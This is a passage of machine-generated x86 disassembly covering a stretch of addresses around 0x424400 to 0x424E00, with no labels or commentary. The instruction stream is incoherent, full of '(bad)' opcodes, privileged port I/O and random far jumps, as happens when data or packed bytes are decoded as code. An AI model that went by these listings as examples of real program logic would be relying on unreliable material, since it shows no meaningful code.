  424408:	add    eax,0x8e000001
  42440d:	into   
  42440e:	outs   dx,BYTE PTR ds:[esi]
  42440f:	xor    ecx,DWORD PTR [ebx+0x1e]
  424412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424413:	les    ebx,FWORD PTR [ebp-0x259e6a32]
  424419:	or     cl,BYTE PTR [edi]
  42441b:	push   ss
  42441c:	sub    DWORD PTR [edi],esi
  42441e:	dec    eax
  42441f:	sbb    al,0xa8
  424421:	push   esi
  424422:	add    eax,0xd763d947
  424427:	scas   al,BYTE PTR es:[edi]
  424428:	out    dx,al
  424429:	adc    al,0xd9
  42442b:	popf   
  42442c:	push   edx
  42442d:	and    al,0x79
  42442f:	outs   dx,BYTE PTR ds:[esi]
  424430:	aas    
  424431:	sahf   
  424432:	inc    ebp
  424433:	rcr    DWORD PTR [esi],cl
  424435:	je     0x424434
  424437:	xchg   edi,eax
  424438:	xor    DWORD PTR [esi],0x57
  42443b:	pop    ds
  42443c:	leave  
  42443d:	push   ds
  42443e:	ja     0x42445e
  424440:	repnz mov eax,0x10556d29
  424446:	inc    ebp
  424447:	jecxz  0x424474
  424449:	cli    
  42444a:	cs out dx,eax
  42444c:	cmc    
  42444d:	gs loopne 0x424447
  424450:	adc    BYTE PTR [eax-0x45f6b854],al
  424456:	mov    esp,0x3a8da06c
  42445b:	das    
  42445c:	dec    edx
  42445d:	mov    ds:0xee7d7f33,al
  424462:	mov    ds:0x779cb559,eax
  424467:	ficom  WORD PTR [edx+ecx*4-0x1d5da324]
  42446e:	adc    ah,BYTE PTR [ebp-0xa0d57b2]
  424474:	cmp    DWORD PTR [edi-0x47a794d8],esi
  42447a:	jne    0x42448a
  42447c:	mov    dh,0xf0
  42447e:	fs push ebx
  424480:	mov    eax,0xa67ca26c
  424485:	mov    ds:0x836d5d05,al
  42448a:	cmp    DWORD PTR [esi+0x2432f041],edi
  424490:	loopne 0x42447e
  424492:	adc    eax,DWORD PTR [ebp+0x71]
  424495:	jbe    0x42446e
  424497:	cmp    al,0x32
  424499:	fdivr  st(0),st
  42449b:	(bad)  
  42449c:	fdiv   st,st(5)
  42449e:	shl    BYTE PTR [eax+0x6f9b1a84],cl
  4244a4:	punpckldq mm7,DWORD PTR [ecx-0x1a]
  4244a8:	or     eax,DWORD PTR [edi-0x449c361d]
  4244ae:	(bad)  [ebx-0x5]
  4244b1:	pop    esp
  4244b2:	enter  0xf03b,0xc8
  4244b6:	es loope 0x424504
  4244b9:	test   BYTE PTR [ebx-0x35],bh
  4244bc:	jns    0x4244de
  4244be:	pop    ebx
  4244bf:	in     eax,dx
  4244c0:	imul   edi,DWORD PTR [edx+ebx*4],0xffffffaf
  4244c4:	add    edx,DWORD PTR [edx-0xf]
  4244c7:	dec    ebx
  4244c8:	mov    BYTE PTR [edx+0x27305c84],ah
  4244ce:	shr    DWORD PTR cs:[eax-0x47],0x7e
  4244d3:	adc    eax,0x4065c104
  4244d8:	test   eax,0x8a187640
  4244dd:	pushw  ss
  4244df:	dec    esi
  4244e0:	inc    esi
  4244e1:	test   BYTE PTR gs:[esi+0x4267d32d],dl
  4244e8:	cs dec ecx
  4244ea:	imul   DWORD PTR [ecx-0x35]
  4244ed:	mov    esi,DWORD PTR [ecx+0x1d827d1b]
  4244f3:	add    BYTE PTR ds:0xf5370c93,bl
  4244f9:	test   al,dl
  4244fb:	jb     0x424571
  4244fd:	add    ebp,DWORD PTR ds:0x156726e5
  424503:	push   cs
  424504:	jne    0x424575
  424506:	outs   dx,BYTE PTR ds:[esi]
  424507:	out    0xf0,eax
  424509:	aaa    
  42450a:	arpl   dx,sp
  42450c:	jecxz  0x4244f7
  42450e:	inc    esi
  42450f:	test   al,0x30
	...
  424571:	add    BYTE PTR [eax],al
  424573:	add    al,ah
  424575:	outs   dx,DWORD PTR ds:[esi]
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4-0x61],1
  424581:	or     DWORD PTR [ebp-0x6f],ebx
  424584:	inc    edi
  424585:	test   BYTE PTR [ecx],al
  424587:	add    BYTE PTR ds:0x8000001,al
  42458d:	fwait
  42458e:	in     al,dx
  42458f:	loop   0x42459c
  424591:	in     al,0x6c
  424593:	punpckhbw mm4,mm7
  424596:	push   edx
  424597:	jo     0x42460d
  424599:	mov    edx,0xa244c9d4
  42459e:	inc    ebp
  42459f:	into   
  4245a0:	inc    esp
  4245a1:	aad    0x33
  4245a3:	pusha  
  4245a4:	(bad)  [edx+0x1b7378fc]
  4245aa:	into   
  4245ab:	xchg   ecx,eax
  4245ac:	das    
  4245ad:	jnp    0x42455e
  4245af:	push   esp
  4245b0:	mov    DWORD PTR [eax],0x88746f63
  4245b6:	pop    edi
  4245b7:	test   eax,0xfa6a20d7
  4245bc:	scas   al,BYTE PTR es:[edi]
  4245bd:	aaa    
  4245be:	push   ecx
  4245bf:	imul   bl
  4245c1:	push   0x62f335a6
  4245c6:	inc    ecx
  4245c7:	aas    
  4245c8:	test   DWORD PTR [esp+ebx*1],eax
  4245cb:	cmp    ch,BYTE PTR [edi]
  4245cd:	arpl   ax,dx
  4245cf:	push   ebx
  4245d0:	inc    edi
  4245d1:	pop    es
  4245d2:	jmp    0xeab9:0xc95f87fd
  4245d9:	sub    cl,bh
  4245db:	leave  
  4245dc:	dec    edx
  4245dd:	out    0x27,eax
  4245df:	cmc    
  4245e0:	(bad)  
  4245e1:	stos   BYTE PTR es:[edi],al
  4245e2:	std    
  4245e3:	(bad)  
  4245e4:	aam    0x56
  4245e6:	sub    DWORD PTR [esi+0x2eccccfb],eax
  4245ec:	sbb    BYTE PTR [ebp+0x3c48bff7],dh
  4245f2:	fcmovbe st,st(4)
  4245f4:	adc    BYTE PTR [ebx+0x37],0xa2
  4245f8:	test   eax,0x47fa88e5
  4245fd:	adc    edx,DWORD PTR [ecx]
  4245ff:	imul   esp,DWORD PTR ds:0xae2ef81a,0x57
  424606:	jp     0x4245fc
  424608:	pop    ss
  424609:	xor    ebx,DWORD PTR ds:0xc99c5027
  42460f:	imul   BYTE PTR [edx]
  424611:	push   es
  424612:	data16 scas al,BYTE PTR es:[edi]
  424614:	mov    ecx,DWORD PTR [edx-0x2]
  424617:	add    DWORD PTR [eax-0x76abe2eb],0xffffff8c
  42461e:	add    al,0x69
  424620:	addps  xmm0,XMMWORD PTR [eax-0x61ba1463]
  424627:	dec    esp
  424628:	cmp    BYTE PTR [ecx-0x34e8d172],bl
  42462e:	xor    al,0xf6
  424630:	out    0xd7,al
  424632:	lods   eax,DWORD PTR ds:[esi]
  424633:	mov    esi,0x4dc02075
  424638:	cmp    ebp,0x7c6eea65
  42463e:	sbb    ebx,DWORD PTR [edi+0x345113b8]
  424644:	popa   
  424645:	faddp  st(4),st
  424647:	out    dx,al
  424648:	sahf   
  424649:	pop    esp
  42464a:	shl    DWORD PTR [edx+eax*8],1
  42464d:	sub    al,0xb7
  42464f:	mov    cl,0x99
  424651:	addr16 push edi
  424653:	mov    ds:0x14ae2dfb,al
  424658:	pop    esp
  424659:	xor    BYTE PTR [edi-0x5e26e0a7],dh
  42465f:	ret    
  424660:	(bad)  
  424661:	rcl    DWORD PTR [esi+0x4e729ef4],cl
  424667:	fcom   QWORD PTR [edx-0x7a]
  42466b:	push   edx
  42466c:	dec    esi
  42466d:	pop    ecx
  42466e:	ror    BYTE PTR [edi+ebx*4-0x434b94f8],cl
  424675:	out    0x50,al
  424677:	call   0x2a21155
  42467c:	in     eax,dx
  42467d:	cmp    edi,DWORD PTR [eax-0x61113274]
  424683:	sbb    edi,edi
  424685:	jp     0x424614
  424687:	in     al,dx
  424688:	or     DWORD PTR [ecx+ebp*2+0x6b4a1fb5],esi
  42468f:	adc    bl,cl
	...
  4246f1:	add    BYTE PTR [eax],al
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [edi+0x4c85cc5a],ch
  424705:	test   DWORD PTR [ecx],eax
  424707:	add    BYTE PTR ds:0x8000001,al
  42470d:	or     al,0x49
  42470f:	inc    ebx
  424710:	sbb    esp,ebx
  424712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424713:	aas    
  424714:	cdq    
  424715:	ja     0x4246f3
  424717:	xor    ebx,eax
  424719:	xlat   BYTE PTR ds:[ebx]
  42471a:	dec    edx
  42471b:	lods   al,BYTE PTR ds:[esi]
  42471c:	aad    0x59
  42471e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42471f:	pop    edi
  424720:	daa    
  424721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424722:	pop    ebp
  424723:	int3   
  424724:	imul   eax,DWORD PTR [ebp+0x61aaa941],0x5a
  42472b:	mov    edx,0x38135bde
  424730:	mov    esp,0xb53f5786
  424735:	dec    ebx
  424736:	cmp    DWORD PTR [esi],ebp
  424738:	xlat   BYTE PTR ds:[ebx]
  424739:	push   eax
  42473a:	pop    ss
  42473b:	jns    0x424714
  42473d:	sbb    dh,BYTE PTR [ebp+eax*1-0x4efe6f8a]
  424744:	and    DWORD PTR [edx+esi*8-0x3b],esi
  424748:	mov    dl,0x64
  42474a:	fst    DWORD PTR [ebx]
  42474c:	xor    DWORD PTR [edi],esi
  42474e:	or     dh,BYTE PTR [ecx-0x19]
  424751:	and    al,0x9f
  424753:	push   ecx
  424754:	test   BYTE PTR [edi+ebx*4+0x4068e58d],ah
  42475b:	and    ch,BYTE PTR [edx]
  42475d:	or     ebp,eax
  42475f:	mov    esp,0xfa5b77b3
  424764:	shl    bl,1
  424766:	jle    0x4247a4
  424768:	or     bl,bl
  42476a:	aam    0xdb
  42476c:	repnz mov eax,0x1a27691c
  424772:	test   BYTE PTR [edx],bh
  424774:	pop    esi
  424775:	sbb    bl,BYTE PTR [ecx+ebp*1]
  424778:	cmp    dh,BYTE PTR [edi+edx*4-0x73]
  42477c:	sub    eax,0xb92be27f
  424781:	sbb    DWORD PTR [edi+0x61],esi
  424784:	add    dl,BYTE PTR [edx+ecx*4]
  424787:	test   al,0xfc
  424789:	outs   dx,DWORD PTR ds:[esi]
  42478a:	mov    dl,0xa1
  42478c:	mov    dh,0xa7
  42478e:	fcom   QWORD PTR [ebp-0x16]
  424791:	xchg   esp,eax
  424792:	shr    DWORD PTR [ebx-0xb490092],0x65
  424799:	aad    0x98
  42479b:	sahf   
  42479c:	jp     0x4247b3
  42479e:	mov    ebx,0x73a7ece4
  4247a3:	repnz mov al,0x6a
  4247a6:	arpl   WORD PTR [esi],bp
  4247a8:	mov    ebp,0x1ea4ff04
  4247ad:	jmp    0x424761
  4247af:	js     0x424740
  4247b1:	sub    esp,DWORD PTR [eax+0x7c]
  4247b4:	dec    esi
  4247b5:	pop    edi
  4247b6:	dec    ebx
  4247b7:	jp     0x424803
  4247b9:	loopne 0x424821
  4247bb:	(bad)  
  4247bc:	mov    ebp,0x4fb29435
  4247c1:	in     eax,0x8e
  4247c3:	cmp    dl,BYTE PTR [ecx+0x18f5c6bf]
  4247c9:	mov    WORD PTR [eax+edi*2],gs
  4247cc:	shl    DWORD PTR [ebx-0x1b],cl
  4247cf:	daa    
  4247d0:	pop    esi
  4247d1:	cli    
  4247d2:	cmp    DWORD PTR [edx+0x15d1813a],0x3a
  4247d9:	and    ebx,ebp
  4247db:	jle    0x42481e
  4247dd:	push   esi
  4247de:	mul    DWORD PTR [eax-0x1750ea53]
  4247e4:	dec    esp
  4247e5:	aaa    
  4247e6:	cmp    dh,BYTE PTR [ebx]
  4247e8:	dec    ebp
  4247e9:	xor    ecx,esi
  4247eb:	loope  0x42478e
  4247ed:	pop    ebp
  4247ee:	jb     0x424771
  4247f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247f1:	inc    ecx
  4247f2:	push   edi
  4247f3:	mov    ch,al
  4247f5:	dec    ebx
  4247f6:	nop
  4247f7:	adc    DWORD PTR [eax],eax
  4247f9:	push   ebx
  4247fa:	sub    eax,0x412d24eb
  4247ff:	loop   0x4247ef
  424801:	pop    es
  424802:	and    DWORD PTR [ebx+edx*4-0x65],edx
  424806:	ins    BYTE PTR es:[edi],dx
  424807:	mov    esi,0xe7cee0c7
  42480c:	cmp    BYTE PTR [edi],0x68
  42480f:	cmp    BYTE PTR [eax+0x0],al
	...
  424872:	add    BYTE PTR [eax],al
  424874:	and    bl,BYTE PTR [eax-0x7c]
  424877:	out    dx,eax
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	div    BYTE PTR [ecx+edi*8+0x18651c9]
  424887:	add    BYTE PTR ds:0x5b000001,al
  42488d:	cmp    eax,DWORD PTR [edx-0x48d067a4]
  424893:	fwait
  424894:	int    0xde
  424896:	jg     0x4248a5
  424898:	loopne 0x4248ec
  42489a:	or     DWORD PTR [esi+0x15],0x41f09f62
  4248a1:	les    esi,FWORD PTR [eax]
  4248a3:	mov    al,ds:0x4c5f8150
  4248a8:	inc    ebp
  4248a9:	add    BYTE PTR [edi+0xb9b5376],bh
  4248af:	pusha  
  4248b0:	pop    ds
  4248b1:	fadd   QWORD PTR [ecx]
  4248b3:	mul    BYTE PTR ds:[ecx+0x7d95bf13]
  4248ba:	not    DWORD PTR [ecx]
  4248bc:	pop    esp
  4248bd:	or     edi,DWORD PTR [esp+ecx*8]
  4248c0:	add    edx,ebp
  4248c2:	xchg   BYTE PTR [eax],dh
  4248c4:	sub    dh,0x77
  4248c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248c8:	test   DWORD PTR [ebx],esi
  4248ca:	push   ebx
  4248cb:	out    0xd8,eax
  4248cd:	jecxz  0x424935
  4248cf:	xor    eax,0x808a755d
  4248d4:	adc    BYTE PTR [ebx],ah
  4248d6:	sahf   
  4248d7:	pop    ecx
  4248d8:	push   ebx
  4248d9:	xor    edi,esi
  4248db:	rol    BYTE PTR [ebp+0x12d3b381],0x57
  4248e2:	into   
  4248e3:	push   ecx
  4248e4:	(bad)  
  4248e5:	sub    DWORD PTR cs:[edi+0x52],ecx
  4248e9:	mov    ds:0xe6f3e73c,eax
  4248ee:	pop    edx
  4248ef:	push   ebp
  4248f0:	and    BYTE PTR [edi-0x6e5bc4ba],ah
  4248f6:	mov    ecx,0xc7760937
  4248fb:	sbb    eax,0x11ff6165
  424900:	push   ss
  424901:	scas   al,BYTE PTR es:[edi]
  424902:	stc    
  424903:	inc    esp
  424904:	ret    0x8949
  424907:	mov    DWORD PTR [edx],esi
  424909:	or     ah,al
  42490b:	in     al,0x7
  42490d:	sub    BYTE PTR [edi+0x2335876c],dl
  424913:	push   edx
  424914:	jmp    0x6010f7cb
  424919:	retf   0x1cd
  42491c:	sbb    cl,dh
  42491e:	jb     0x424998
  424920:	loope  0x4248cc
  424922:	inc    esi
  424923:	fstp   DWORD PTR [ebx+ebx*4+0x5f]
  424927:	scas   eax,DWORD PTR es:[edi]
  424928:	iret   
  424929:	fsub   DWORD PTR [ebp+0x19]
  42492c:	cmp    al,dl
  42492e:	mov    DWORD PTR [ebp+0x34],esp
  424931:	pop    eax
  424932:	lea    esp,[eax-0x51]
  424935:	xor    ch,BYTE PTR [edx+0x3e]
  424938:	mov    esp,0x86b2f913
  42493d:	push   ebx
  42493e:	push   esp
  42493f:	shr    BYTE PTR [edi+0x4b],cl
  424942:	mov    al,ds:0x809014ca
  424947:	jnp    0x424914
  424949:	call   0x32f3:0xc360e4cb
  424950:	ins    BYTE PTR es:[edi],dx
  424951:	inc    eax
  424952:	inc    edx
  424953:	add    eax,0xcd6d6708
  424958:	cdq    
  424959:	cld    
  42495a:	push   esp
  42495b:	retf   0x4773
  42495e:	mov    edi,0x17c32de4
  424963:	push   ecx
  424964:	retf   0x89e2
  424967:	repz mov ds:0x7a39aa63,eax
  42496d:	retf   0x488
  424970:	test   DWORD PTR [eax+ecx*1+0x1],0xccbd79c4
  424978:	cld    
  424979:	mov    eax,0x325c9ab9
  42497e:	in     eax,0x6b
  424980:	fstp   QWORD PTR [edx]
  424982:	adc    eax,0x3e1299d0
  424987:	jnp    0x42495e
  424989:	loop   0x4249eb
  42498b:	adc    BYTE PTR [ebp-0x39],cl
  42498e:	cld    
  42498f:	into   
  424990:	xchg   BYTE PTR [eax],al
	...
  4249f2:	add    BYTE PTR [eax],al
  4249f4:	imul   ebx,DWORD PTR [eax],0x63
  4249f7:	push   0x73
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    ch,bh
  424a01:	push   ds
  424a02:	inc    edx
  424a03:	fs push esi
  424a05:	xchg   DWORD PTR [ecx],eax
  424a07:	add    BYTE PTR ds:0xeb000001,al
  424a0d:	ret    0xd2fb
  424a10:	push   es
  424a11:	test   BYTE PTR [ecx+0xc],al
  424a14:	sbb    DWORD PTR [ebx+0x7e180e5d],eax
  424a1a:	cwde   
  424a1b:	mov    ds:0xabce884a,eax
  424a20:	popf   
  424a21:	nop
  424a22:	fwait
  424a23:	iret   
  424a24:	push   cs
  424a25:	mov    al,0x8a
  424a27:	sbb    BYTE PTR [ebx+0x7f],dl
  424a2a:	mov    ds:0xaa36b751,eax
  424a2f:	jne    0x4249b3
  424a31:	dec    edx
  424a32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a33:	cmp    edx,esp
  424a35:	ficomp DWORD PTR [esi-0x1d]
  424a38:	xchg   ecx,ecx
  424a3a:	dec    edi
  424a3b:	sahf   
  424a3c:	cmp    al,0xc3
  424a3e:	or     al,0x1
  424a40:	enter  0x5691,0x42
  424a44:	nop
  424a45:	sbb    dl,ch
  424a47:	pop    es
  424a48:	xchg   ebx,eax
  424a49:	cmp    ecx,edi
  424a4b:	popa   
  424a4c:	push   es
  424a4d:	ja     0x424a0c
  424a4f:	retf   
  424a50:	loope  0x424ac1
  424a52:	pop    ds
  424a53:	int3   
  424a54:	inc    eax
  424a55:	push   ss
  424a56:	mov    BYTE PTR [edx],al
  424a58:	pushf  
  424a59:	das    
  424a5a:	js     0x424a42
  424a5c:	shr    ebx,1
  424a5e:	or     DWORD PTR [ebp-0x63f64f93],esi
  424a64:	inc    ebp
  424a65:	push   edi
  424a66:	in     eax,dx
  424a67:	inc    esi
  424a68:	add    eax,0xdfe3401d
  424a6d:	and    ebx,0x5ac15633
  424a73:	xor    eax,DWORD PTR [ebp-0x28]
  424a76:	mov    ebx,0xc88285b1
  424a7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a7c:	ret    0x5fc3
  424a7f:	adc    DWORD PTR [ecx],esp
  424a81:	mov    ebp,0x85b95617
  424a86:	mov    eax,0xe624e3b6
  424a8b:	test   esp,0xa8bd5cb6
  424a91:	sub    al,0x26
  424a93:	test   al,0x23
  424a95:	mov    fs,ecx
  424a97:	xor    BYTE PTR [edi+edi*1+0x584cd614],cl
  424a9e:	mov    esi,0xebac3db4
  424aa3:	jge    0x424a66
  424aa5:	popf   
  424aa6:	outs   dx,BYTE PTR ds:[esi]
  424aa7:	ja     0x424ac4
  424aa9:	in     al,0xfc
  424aab:	les    edx,FWORD PTR [ecx]
  424aad:	mov    esp,0xde0c936
  424ab2:	fimul  DWORD PTR [edx+ecx*8-0x15]
  424ab6:	stos   BYTE PTR es:[edi],al
  424ab7:	or     al,0x1f
  424ab9:	mov    ds:0x2cd9d60a,eax
  424abe:	jae    0x424aa7
  424ac0:	pushf  
  424ac1:	pushf  
  424ac2:	retf   
  424ac3:	dec    esi
  424ac5:	das    
  424ac6:	retf   
  424ac7:	mov    bh,0x9
  424ac9:	add    esp,DWORD PTR [edi]
  424acb:	pushf  
  424acc:	iret   
  424acd:	push   ecx
  424ace:	jns    0x424ac6
  424ad0:	pushf  
  424ad1:	mov    esp,DWORD PTR [eax]
  424ad3:	int3   
  424ad4:	pop    es
  424ad5:	out    dx,eax
  424ad6:	shr    BYTE PTR fs:[esi-0x26],cl
  424ada:	int    0x7d
  424adc:	(bad)  
  424add:	cmp    bh,ah
  424adf:	out    0xcb,eax
  424ae1:	cmp    dh,BYTE PTR [eax-0x3d]
  424ae4:	xor    ecx,eax
  424ae6:	and    ebp,ecx
  424ae8:	test   DWORD PTR [ecx],esi
  424aea:	jmp    0xeca62ee2
  424aef:	xchg   ecx,eax
  424af0:	ins    DWORD PTR es:[edi],dx
  424af1:	or     dl,0x47
  424af4:	dec    edi
  424af5:	pop    eax
  424af6:	aaa    
  424af7:	xor    al,0xff
  424af9:	ret    0x9895
  424afc:	imul   ecx,DWORD PTR [edi],0x44
  424aff:	shr    dh,0x2d
  424b02:	jne    0x424ab8
  424b04:	das    
  424b05:	pop    ss
  424b06:	push   ss
  424b07:	dec    ebp
  424b08:	pop    ecx
  424b09:	std    
  424b0a:	aad    0xa1
  424b0c:	dec    esi
  424b0d:	jl     0x424aac
  424b0f:	dec    eax
  424b10:	mov    edx,0x0
	...
  424b71:	add    BYTE PTR [eax],al
  424b73:	add    BYTE PTR [esi],al
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	jmp    0x5be8424d
  424b85:	mov    BYTE PTR [ecx],al
  424b87:	add    BYTE PTR ds:0x14000001,al
  424b8d:	inc    esi
  424b8e:	loope  0x424bc8
  424b90:	je     0x424b28
  424b92:	jge    0x424b2c
  424b94:	inc    edi
  424b95:	push   ds
  424b96:	jg     0x424b36
  424b98:	xor    BYTE PTR [eax+0x2],cl
  424b9b:	adc    al,dh
  424b9d:	es mov bh,0x0
  424ba0:	(bad)  
  424ba1:	fstp   QWORD PTR [edi+esi*1+0x67a9b270]
  424ba8:	idiv   esp
  424baa:	or     DWORD PTR [edi+0x62],ebp
  424bad:	dec    eax
  424bae:	push   edi
  424baf:	test   al,0xb3
  424bb1:	(bad)  
  424bb2:	jmp    0xd29e7ba7
  424bb7:	push   esi
  424bb8:	or     al,0x2
  424bba:	mov    eax,ds:0xd25fa04d
  424bbf:	mov    esi,0x963a3ef1
  424bc4:	xchg   ecx,eax
  424bc5:	xor    al,0x8
  424bc7:	mov    edi,0x2b4d2220
  424bcc:	loopne 0x424bb2
  424bce:	std    
  424bcf:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  424bd1:	out    dx,al
  424bd2:	and    al,0xe2
  424bd4:	jne    0x424c0a
  424bd6:	loopne 0x424c39
  424bd8:	mov    WORD PTR [esi],es
  424bda:	repnz (bad) 
  424bdc:	xor    ch,cl
  424bde:	sub    cl,ah
  424be0:	outs   dx,DWORD PTR ds:[esi]
  424be1:	sub    al,bh
  424be3:	out    dx,al
  424be4:	dec    edx
  424be5:	iret   
  424be6:	ficomp DWORD PTR [edi]
  424be8:	add    ebp,eax
  424bea:	pop    ebx
  424beb:	ins    BYTE PTR es:[edi],dx
  424bec:	stos   DWORD PTR es:[edi],eax
  424bed:	(bad)  
  424bee:	push   ecx
  424bef:	push   0xfffffff1
  424bf1:	sti    
  424bf2:	sahf   
  424bf3:	push   ebp
  424bf4:	cmp    al,0x75
  424bf6:	inc    eax
  424bf7:	add    eax,0x86fa6a13
  424bfc:	shl    DWORD PTR [edx+0x76],cl
  424bff:	mov    cs:0xd414c8ce,al
  424c05:	jg     0x424c73
  424c07:	mov    BYTE PTR [ecx],cl
  424c09:	addr16 xor al,0xa1
  424c0c:	js     0x424c4d
  424c0e:	or     ebp,ebp
  424c10:	pop    ebp
  424c11:	fnstsw WORD PTR [ecx+ecx*4+0x4]
  424c15:	xor    BYTE PTR [eax],dl
  424c17:	leave  
  424c18:	add    al,0x9e
  424c1b:	(bad)  
  424c1c:	push   ebp
  424c1d:	and    BYTE PTR gs:[ecx],bl
  424c20:	xlat   BYTE PTR ds:[ebx]
  424c21:	sbb    al,0xdf
  424c23:	push   cs
  424c24:	repz jns 0x424c42
  424c27:	rcr    DWORD PTR [ebx],cl
  424c29:	sti    
  424c2a:	repnz mov ch,0xe7
  424c2d:	pop    ecx
  424c2e:	(bad)  
  424c2f:	dec    ecx
  424c30:	ss push 0x62
  424c33:	xchg   edx,eax
  424c34:	mov    al,ds:0x69a5e71b
  424c39:	inc    edx
  424c3a:	jecxz  0x424bc4
  424c3c:	mov    bh,0x6a
  424c3e:	lahf   
  424c3f:	cli    
  424c40:	icebp  
  424c41:	imul   ebx,DWORD PTR [ecx],0x896ab78b
  424c47:	call   0xc699:0xc33230e4
  424c4e:	enter  0x1d8e,0x40
  424c52:	jbe    0x424c95
  424c54:	add    ecx,ebx
  424c56:	mov    DWORD PTR [edi],esi
  424c58:	mov    eax,0x63b3461d
  424c5d:	in     al,0x5e
  424c5f:	inc    dh
  424c61:	ds jmp 0x12c41854
  424c67:	leave  
  424c68:	xor    BYTE PTR [ebp-0x294e1523],ch
  424c6e:	fidiv  DWORD PTR [edx-0x39]
  424c71:	mov    eax,DWORD PTR [edx]
  424c73:	out    dx,eax
  424c74:	sub    al,0xe0
  424c76:	jmp    DWORD PTR [edx+esi*8+0x25]
  424c7a:	pop    edx
  424c7b:	fist   DWORD PTR ss:[eax+0x73b27e2d]
  424c82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c83:	retf   0xf195
  424c86:	test   eax,0xdea904db
  424c8b:	rol    DWORD PTR [ebx],1
  424c8d:	xchg   edx,eax
  424c8e:	imul   edi,DWORD PTR [eax+0x7a],0x0
	...
  424cf4:	ins    BYTE PTR es:[edi],dx
  424cf5:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424cfc:	bound  ebx,QWORD PTR [ebx-0x5fd9ae58]
  424d02:	fs clc 
  424d04:	pusha  
  424d05:	mov    DWORD PTR [ecx],eax
  424d07:	add    BYTE PTR ds:0xee000001,al
  424d0d:	or     DWORD PTR [eax],0xffffff8e
  424d10:	test   ebx,edx
  424d12:	adc    ebx,DWORD PTR [esi-0x19509025]
  424d18:	xor    dl,BYTE PTR [eax+0x43]
  424d1b:	xchg   DWORD PTR [edx-0x5c47c842],ebp
  424d21:	dec    ebp
  424d22:	mov    al,ds:0xefd28d4e
  424d27:	mov    edi,0x1d0bb718
  424d2c:	pushf  
  424d2d:	repz xor al,0x50
  424d30:	mul    DWORD PTR [edi]
  424d32:	rol    BYTE PTR [ecx+0x46],1
  424d35:	stc    
  424d36:	mov    WORD PTR [esp+esi*4],fs
  424d39:	call   0xde0c:0xcc2cc646
  424d40:	sbb    BYTE PTR [eax+0x5f3bacda],cl
  424d46:	push   edx
  424d47:	inc    edx
  424d48:	dec    ebp
  424d49:	mov    ?,WORD PTR [ebx-0x64d4e021]
  424d4f:	sbb    eax,DWORD PTR [esi+eax*8]
  424d52:	dec    esp
  424d53:	lahf   
  424d54:	inc    ebx
  424d55:	adc    eax,0x7c1232c9
  424d5a:	mov    al,ds:0x7936367a
  424d5f:	pop    edx
  424d60:	jae    0x424db5
  424d62:	pop    esp
  424d63:	add    DWORD PTR [esi-0x6a2dd991],esi
  424d69:	push   edx
  424d6a:	cmp    al,0x55
  424d6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d6d:	and    DWORD PTR [edi-0x24],ebp
  424d70:	in     eax,dx
  424d71:	sub    edx,DWORD PTR [edx-0x5b]
  424d74:	or     DWORD PTR [ebp-0x7a7df4c9],0x91305fb6
  424d7e:	lea    ecx,[eax-0x2e]
  424d81:	jns    0x424dd7
  424d83:	mov    ebx,0x7565b403
  424d88:	push   edx
  424d89:	push   ss
  424d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d8b:	mov    eax,gs:0xe01a47f9
  424d91:	lahf   
  424d92:	iret   
  424d93:	pop    ds
  424d94:	inc    edi
  424d95:	fchs   
  424d97:	int    0xa0
  424d99:	js     0x424df5
  424d9b:	into   
  424d9c:	dec    edi
  424d9d:	int    0x9b
  424d9f:	sbb    ah,BYTE PTR [ebx]
  424da1:	inc    esp
  424da2:	neg    BYTE PTR [edx-0x3c]
  424da5:	or     ebx,DWORD PTR [esi-0x59596180]
  424dab:	adc    si,bx
  424dae:	push   edi
  424daf:	dec    ebp
  424db0:	mov    edx,0xee8bff4a
  424db5:	stos   DWORD PTR es:[edi],eax
  424db6:	mov    dh,BYTE PTR [eax+ebp*4+0x28]
  424dba:	sahf   
  424dbb:	lock sahf 
  424dbd:	lods   eax,DWORD PTR ds:[esi]
  424dbe:	popa   
  424dbf:	repnz out 0x18,eax
  424dc2:	inc    esi
  424dc3:	cli    
  424dc4:	adc    BYTE PTR [ebp+0x28],bl
  424dc7:	(bad)  
  424dc8:	js     0x424df4
  424dca:	clc    
  424dcb:	mov    ds:0x1bab740d,al
  424dd0:	xchg   esi,eax
  424dd1:	ret    
  424dd2:	icebp  
  424dd3:	xchg   edx,eax
  424dd4:	and    eax,0x8a1a5cc7
  424dd9:	loope  0x424d7e
  424ddb:	popa   
  424ddc:	push   edx
  424ddd:	pop    edi
  424dde:	mov    es,WORD PTR [edi+0x5d]
  424de1:	mov    edi,0xc6127370
  424de6:	mov    ah,0x25
  424de8:	mov    dh,al
  424dea:	lods   eax,DWORD PTR ds:[esi]
  424deb:	mov    edx,ebp
  424ded:	fst    st(7)
  424def:	mov    al,0x6f
  424df1:	cmp    edi,edi
  424df3:	jge    0x424dcb
  424df5:	sbb    eax,0x12279f5c
  424dfa:	dec    edi
  424dfb:	mov    ah,BYTE PTR [edx+0x15ef4bdc]
  424e01:	mov    bl,BYTE PTR [ebx+eax*1]
  424e04:	cmp    BYTE PTR [edx-0x62],0xe2
  424e08:	and    al,0xe5
